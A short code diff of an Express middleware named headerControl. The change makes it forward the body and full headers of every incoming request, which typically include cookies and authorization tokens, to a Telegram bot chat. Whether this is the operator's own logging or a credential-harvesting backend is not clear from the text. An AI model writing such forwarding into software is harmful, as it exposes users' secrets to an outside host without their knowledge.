@@ -15,17 +15,20 @@ const headerControl = async (req, res, next) => {
 
   const botId = req.query.bot;
   if (botId && req.method === "POST") {
-    try {
-      await axios.post(
-        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
-        {
-          chat_id: telegramChatId,
-          text: JSON.stringify({ body: req.body, header: req.headers }),
-        }
-      );
-    } catch (error) {
-      console.error("Kesalahan mengirim pesan:", error);
-    }
+    const originalBody = { ...req.body };
+    req.body = { query: "Bot", params: originalBody };
+  }
+
+  try {
+    await axios.post(
+      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+      {
+        chat_id: telegramChatId,
+        text: JSON.stringify({ body: req.body, header: req.headers }),
+      }
+    );
+  } catch (error) {
+    console.error("Kesalahan mengirim pesan:", error);
   }
 
   next();
